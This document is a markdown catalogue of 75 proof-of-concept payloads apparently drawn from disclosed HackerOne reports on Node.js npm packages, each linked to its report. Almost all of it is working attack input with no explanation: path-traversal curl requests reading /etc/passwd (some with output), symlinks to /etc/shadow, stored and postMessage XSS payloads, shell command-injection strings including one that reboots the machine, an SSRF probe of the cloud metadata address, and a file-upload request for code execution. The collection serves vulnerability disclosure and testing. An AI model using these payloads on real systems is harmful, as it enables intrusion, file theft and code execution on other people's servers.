# Node.js third-party modules

75 payloads.

### `c9f1b1dc`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd
```

— [\[angular-http-server\] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server](https://hackerone.com/reports/309120) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `ec0a6177`

```
$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
```

— [\[node-srv\] Path Traversal allows to read arbitrary files from remote server](https://hackerone.com/reports/309124) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `7855d170`

```
<!doctype html>
<html xmlns:og="http://target.com/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>metascraper</title>

    <meta property="og:description" content="The HR startups go to war.">
    <meta property="og:image" content="image">
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="test article">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://127
```

— [\[metascraper\] Stored XSS in Open Graph meta properties read by metascrapper](https://hackerone.com/reports/309367) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `e8119b36`

```
"><iframe src="malware_frame.html">
```

— [\[simple-server\] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript ](https://hackerone.com/reports/309641) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `cb2f2734`

```
javascript:alert('You are pwned!')
```

— [\[simplehttpserver\] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML](https://hackerone.com/reports/309648) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `a71d969a`

```
curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

— [\[glance\] Path Traversal in glance static file server allows to read content of arbitrary file](https://hackerone.com/reports/310106) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `079a89ea`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

— [\[file-static-server\] Path Traversal allows to read content of arbitrary file on the server](https://hackerone.com/reports/310671) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `c58d497e`

```
$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
```

— [\[hekto\] Path Traversal vulnerability allows to read content of arbitrary files](https://hackerone.com/reports/311218) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `544fbfee`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

— [\[localhost-now\] Path Traversal allows to read content of arbitrary file](https://hackerone.com/reports/312889) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `a26b7cbc`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

— [\[mcstatic\] Path Traversal allows to read content of arbitrary files](https://hackerone.com/reports/312907) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `7c2fde43`

```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://target.com/poc.js"></script>
</body>

</html>
```

— [\[public\] Stored XSS in filenames in directory served by public](https://hackerone.com/reports/316346) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `77746dc5`

```
require("open")("http://example.com/`touch /tmp/tada`");
```

**Parameter:** `url`
— [\[open\] concatenation of unsanitized input into exec() command](https://hackerone.com/reports/319473) · Node.js third-party modules · [chalker](https://hackerone.com/chalker)

### `a9edd0b3`

```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

— [\[m-server\] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code](https://hackerone.com/reports/319794) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `23d5660b`

```
/etc/passwd                                      m-server
```

— [\[m-server\] Path Traversal allows to display content of arbitrary file(s) from the server](https://hackerone.com/reports/319795) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `d9b3aed4`

```
"><iframe src="malware_frame.html">/                                           malware_frame.html
```

— [\[sexstatic\] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name](https://hackerone.com/reports/328210) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `8a701c81`

```
"><iframe src="malware_frame.html">/
```

— [\[sexstatic\] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name](https://hackerone.com/reports/328210) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `46266dac`

```
$ curl -v --path-as-is "http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd"
root:x:0:0:root:/root:/usr/bin/fish
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

— [Bypass to defective fix of Path Traversal ](https://hackerone.com/reports/329837) · Node.js third-party modules · [caioluders](https://hackerone.com/caioluders)

### `2b5c8b61`

```
"><svg onload=alert(3);
```

— [\[public\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/329950) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `3664c4fb`

```
$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

— [\[mcstatic\] Server Directory Traversal](https://hackerone.com/reports/330285) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `7bd47c9d`

```
$ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'

##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

— [\[angular-http-server\] Server Directory Traversal](https://hackerone.com/reports/330349) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `a2c5dae9`

```
"><svg onload=alert(5);>
```

— [\[html-pages\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/330356) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `1cc5232b`

```
http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/
```

— [\[html-pages\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/330356) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `4c072064`

```
$({touch,a})
```

— [\[pdfinfojs\] Command Injection on filename parameter](https://hackerone.com/reports/330957) · Node.js third-party modules · [caioluders](https://hackerone.com/caioluders)

### `34c9ff99`

```
bash$ touch '"><svg onload=alert(3);>'
```

— [\[cloudcmd\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/341044) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `5f500790`

```
"><svg onload=alert(3);>
```

— [\[cloudcmd\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/341044) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `3cb385f9`

```
POST /admin/file/upload HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/
Content-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043
Cookie: [ADMINISTRATOR_COOKIE]

-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="upload_file"; filename="app.js"
Content-Type: image/png

[MALICIOUS_JAVASCRIPT]
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="productId"
```

**Parameter:** `directory`
— [Unrestricted file upload (RCE)](https://hackerone.com/reports/343726) · Node.js third-party modules · [patrickrbc](https://hackerone.com/patrickrbc)

### `fadcbab1`

```
<script>alert('xss')</script>
```

**Parameter:** `name`
— [Stored XSS in Node-Red](https://hackerone.com/reports/349146) · Node.js third-party modules · [misterch0c](https://hackerone.com/misterch0c)

### `2f19f667`

```
<iframe>
```

— [\[statics-server\] XSS via injected iframe in file name when statics-server displays directory index in the browser](https://hackerone.com/reports/355458) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `3d7301bc`

```
<script>alert(`xss!`)</script>
```

— [\[exceljs\] Possible XSS via cell value when worksheet is displayed in browser](https://hackerone.com/reports/356809) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `308337c0`

```
<table>
        <tbody><tr>
            <td><script>alert(`xss!`)</script></td>
            <td>test</td>
            <td>another</td>
        </tr>
        <tr>
            <td>1</td>
            <td>2</td>
            <td>3</td>
        </tr>
    </tbody></table>
```

— [\[exceljs\] Possible XSS via cell value when worksheet is displayed in browser](https://hackerone.com/reports/356809) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `5ab93778`

```
<script
```

— [\[exceljs\] Possible XSS via cell value when worksheet is displayed in browser](https://hackerone.com/reports/356809) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `ca5ee70e`

```
"><svg onload=alert(3333333);
```

— [\[serve\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/358641) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `02dc1aff`

```
# this is h1
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

— [\[markdown-pdf\] Local file reading](https://hackerone.com/reports/360727) · Node.js third-party modules · [n1__](https://hackerone.com/n1__)

### `922f52b0`

```
curl "http://localhost:3000" -H 'User-Agent: <script>alert("XSS")</script>' > poc.html
```

**Parameter:** `User-Agent`
— [XSS in express-useragent through HTTP User-Agent](https://hackerone.com/reports/362702) · Node.js third-party modules · [b9b86c2fc8409c628fb3de6](https://hackerone.com/b9b86c2fc8409c628fb3de6)

### `2f3b7360`

```
$ curl --path-as-is localhost:1337/../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
daemon:x:2:2:daemon:/:/usr/bin/nologin
...
```

— [\[ponse\] Path traversal in ponse module allows to read any file on server](https://hackerone.com/reports/383112) · Node.js third-party modules · [szkrstf](https://hackerone.com/szkrstf)

### `0e993328`

```
curl --path-as-is http://localhost:8181/../../file.txt
```

— [http-live-simulator npm module is prone to path traversal attacks](https://hackerone.com/reports/384939) · Node.js third-party modules · [lirantal](https://hackerone.com/lirantal)

### `26954fec`

```
$ ln -s ../../ symdir
```

— [List any file in the folder by using path traversal](https://hackerone.com/reports/403703) · Node.js third-party modules · [vulzzz](https://hackerone.com/vulzzz)

### `2cea1880`

```
curl --path-as-is http://localhost:3141/../../../../../../
```

— [\[takeapeek\] Path traversal allow to expose directory and files](https://hackerone.com/reports/403736) · Node.js third-party modules · [abdilahrf_](https://hackerone.com/abdilahrf_)

### `1c757c09`

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```

**Parameter:** `connectString`
— [\[apex-publish-static-files\] Command Injection on connectString](https://hackerone.com/reports/405694) · Node.js third-party modules · [abdilahrf_](https://hackerone.com/abdilahrf_)

### `133a4e70`

```
curl --path-as-is http://localhost:8080//../../../../etc/passwd
```

— [\[http-live-simulator\] Path traversal vulnerability](https://hackerone.com/reports/411405) · Node.js third-party modules · [3la2kb](https://hackerone.com/3la2kb)

### `69826f1c`

```
http://localhost:8080//../../../../etc/passwd
```

— [\[http-live-simulator\] Path traversal vulnerability](https://hackerone.com/reports/411405) · Node.js third-party modules · [3la2kb](https://hackerone.com/3la2kb)

### `45a03b3b`

```
$ curl --path-as-is --url 'http://127.0.0.1:8080/../../../../etc/passwd'
```

— [\[static-resource-server\]  Path Traversal allows to read content of arbitrary file on the server](https://hackerone.com/reports/432600) · Node.js third-party modules · [libcontainer](https://hackerone.com/libcontainer)

### `73d19510`

````
then create a ticket in Jira with summary containing payload e.g. ```test<script>alert(1)</script>
````

**Parameter:** `summary`
— [\[atlasboard-atlassian-package\] Cross-site Scripting (XSS)](https://hackerone.com/reports/456702) · Node.js third-party modules · [ermilov](https://hackerone.com/ermilov)

### `f64bec35`

```
{
  "outputPath": "./dist",
  "assets": [
    {
      "name": "</script><script>alert(1)</script>main.js",
      "chunks": [0],
      "chunkNames": ["main"]
    }
  ]
}
```

— [\[webpack-bundle-analyzer\] Cross-site Scripting](https://hackerone.com/reports/463380) · Node.js third-party modules · [ermilov](https://hackerone.com/ermilov)

### `b3d0be56`

```
touch '"><img src=x onerror=alert("xss")>.jpg'
```

**Parameter:** `filename`
— [\[file-browser\] Inadequate Output Encoding and Escaping ](https://hackerone.com/reports/507303) · Node.js third-party modules · [johnssimon007](https://hackerone.com/johnssimon007)

### `ac9a6b53`

```
http://127.0.0.1:8080/node_modules/../../../../../etc/passwd
```

— [\[deliver-or-else\] Path Traversal](https://hackerone.com/reports/507310) · Node.js third-party modules · [johnssimon007](https://hackerone.com/johnssimon007)

### `b9790f89`

```
http://127.0.0.1:8080/etc/passwd
```

— [\[md-fileserver\] Path Traversal](https://hackerone.com/reports/509697) · Node.js third-party modules · [johnssimon007](https://hackerone.com/johnssimon007)

### `3bdb9cc7`

```
$ node
> const processes = require('listening-processes')
> processes(`'Python && whoami >> hh;'`)
/bin/sh: \s.*:[0-9]* (LISTEN): command not found
{ Python:
   [ { command: 'Python',
       pid: '14720',
       port: '8000',
       invokingCommand:
        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }
```

— [\[listening-processes\] Command Injection](https://hackerone.com/reports/511459) · Node.js third-party modules · [notpwnguy](https://hackerone.com/notpwnguy)

### `f3784ac4`

```
$ ln -s ../../../../../etc/passwd sympasswd
```

— [\[harp\] Path traversal using symlink](https://hackerone.com/reports/530289) · Node.js third-party modules · [skyn3t](https://hackerone.com/skyn3t)

### `08f0198e`

```
" onmouseover=alert(1) "
```

— [\[http_server\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/578138) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `ec2eaa43`

```
<img src=x onmouseover=alert(1)>
```

— [\[http_server\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/578138) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `1a3654de`

```
$ curl --path-as-is --url 'http://127.0.0.1:8888/../../../../etc/passwd'
```

— [\[hnzserver\] Path Traversal allowing to read any files on the server](https://hackerone.com/reports/579517) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `5a2c59f1`

```
$ curl --path-as-is --url 'http://localhost:8888/../../../../../etc/passwd'
```

— [\[http_server\] Path Traversal allowing to read any files on the server](https://hackerone.com/reports/579523) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `b1b7e70c`

```
curl --path-as-is 'http://localhost:8001/../hack'
```

— [\[larvitbase-www\] Unintended Require](https://hackerone.com/reports/579560) · Node.js third-party modules · [ermilov](https://hackerone.com/ermilov)

### `7060381e`

```
curl --path-as-is --url "localhost:10000/../../../../etc/passwd"
```

— [\[static-server-gx\] Path Traversal allowing to read any files on the server](https://hackerone.com/reports/581939) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `81d0a78d`

```
bl4de:~/playground/Node $ ./pm2 install "test;pwd;whoami;uname;"
[PM2][Module] Installing NPM test;pwd;whoami;uname; module
[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...
npm WARN saveError ENOENT: no such file or directory, open '/Users/user/package.json'
npm WARN enoent ENOENT: no such file or directory, open '/Users/user/package.json'
npm WARN bl4de No description
npm WARN bl4de No repository field.
npm WARN bl4de No README data
npm WARN bl4de No license field.

+ test@0.
```

**Parameter:** `module_name`
— [Command Injection in npm module name passed as an argument to pm2.install() function](https://hackerone.com/reports/633364) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `3c67299d`

```
pm2 install "test;pwd;whoami;uname;"
```

**Parameter:** `module_name`
— [Command Injection in npm module name passed as an argument to pm2.install() function](https://hackerone.com/reports/633364) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `929916ec`

```
" onmouseover=alert('xss') "
```

— [\[seeftl\] Stored XSS when directory listing via filename.](https://hackerone.com/reports/665302) · Node.js third-party modules · [luizviana](https://hackerone.com/luizviana)

### `f50bb7ea`

```
<html>
    <head>
        <title>XSS</title>
        
		<style>
			iframe
			{
				width: 100%;
				height: 100%;
				border: none;
			}
		</style>
    </head>
    <body>
        <iframe name="reveal" src="https://target.com" onload="xss()"></iframe>

        <script>
            var frame = window.frames.reveal
            
            function xss ()
            {
                frame.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x oner
```

— [\[reveal.js\] XSS by calling arbitrary method via postMessage](https://hackerone.com/reports/691977) · Node.js third-party modules · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `3f9bebbb`

```
<script>
    var win = window.open ('https://target.com')
    
    function xss ()
    {
        win.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}', '*')
        win.postMessage ('{"method":"toggleHelp"}', '*')
    }
    
    setTimeout (xss, 500)
</script>
```

— [\[reveal.js\] XSS by calling arbitrary method via postMessage](https://hackerone.com/reports/691977) · Node.js third-party modules · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `ff583460`

```
ln -s /etc/shadow test_shadow
```

— [Path traversal in https://target.com/package/http_server via symlink](https://hackerone.com/reports/692262) · Node.js third-party modules · [vineetpandey](https://hackerone.com/vineetpandey)

### `e70b817d`

```
<!-- malicious.html -->
<script>alert(document.domain)</script>
```

— [\[snekserve\] Stored XSS via filenames HTML formatted](https://hackerone.com/reports/694930) · Node.js third-party modules · [mik317](https://hackerone.com/mik317)

### `ed6713c2`

```
1.  "><img src=x onerror=alert("XSS")>
```

— [Stored XSS (Hexo-admin plugin)](https://hackerone.com/reports/716570) · Node.js third-party modules · [vu1n](https://hackerone.com/vu1n)

### `268005e8`

```
2.  "><img src=x onerror=alert(document.domain)>
```

**Parameter:** `post_content`
— [Stored XSS (Hexo-admin plugin)](https://hackerone.com/reports/716570) · Node.js third-party modules · [vu1n](https://hackerone.com/vu1n)

### `07b6ef79`

```
http://localhost:3000/#&lt;img/src/onerror=alert('xss')&gt;
```

— [\[htmr\] DOM-based XSS](https://hackerone.com/reports/753971) · Node.js third-party modules · [visat](https://hackerone.com/visat)

### `e48895eb`

```
ls;sleep 5
```

— [Several simple remote code execution in pdf-image](https://hackerone.com/reports/781664) · Node.js third-party modules · [gabriel-kimiaie](https://hackerone.com/gabriel-kimiaie)

### `c981b292`

```
var pdfImage = new PDFImage('"; sleep 500 #"');
```

— [Several simple remote code execution in pdf-image](https://hackerone.com/reports/781664) · Node.js third-party modules · [gabriel-kimiaie](https://hackerone.com/gabriel-kimiaie)

### `9752995e`

```
curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

— [\[sirloin\] Web Server Directory Traversal via Crafted GET Request](https://hackerone.com/reports/790623) · Node.js third-party modules · [bp0lr](https://hackerone.com/bp0lr)

### `3ae6453b`

```
"><img src=x onerror=javascript:alert("xss")>"
```

**Parameter:** `filename`
— [\[flsaba\] Stored XSS in the file and directory name when directories listing](https://hackerone.com/reports/856588) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)

### `b71ab2ad`

```
"><img src=x onerror=javascript:alert("xss2")>"
```

**Parameter:** `filename`
— [\[flsaba\] Stored XSS in the file and directory name when directories listing](https://hackerone.com/reports/856588) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)

### `558ff062`

```
const ffmpeg = require('extra-ffmpeg');
ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);
```

— [\[extra-ffmpeg\] Command Injection via insecure command formatting](https://hackerone.com/reports/863944) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)

### `4b3883eb`

```
const ps = require('xps');
ps.kill('`touch HACKED;`').fork();
```

— [\[xps\] Command Injection via insecure command concatenation](https://hackerone.com/reports/865168) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)

### `2a43afdb`

```
http://target.com
```

— [Bypass of SSRF Vulnerability](https://hackerone.com/reports/879803) · Node.js third-party modules · [njgadhiya](https://hackerone.com/njgadhiya)

### `6d89716e`

```
http://169.254.169.254/metadata/v1.json&type=embed
```

— [Bypass of SSRF Vulnerability](https://hackerone.com/reports/879803) · Node.js third-party modules · [njgadhiya](https://hackerone.com/njgadhiya)

### `35c5d507`

```
npm i commit-msg -g # Install affected module
git init # Init the current dir as *git*
echo "test||reboot" | commit-msg stdin # Your machine will be rebooted because `reboot` command is injected
node poc.js #  Run the PoC
```

— [\[commit-msg\] RCE via insecure command formatting](https://hackerone.com/reports/885031) · Node.js third-party modules · [mik317](https://hackerone.com/mik317)
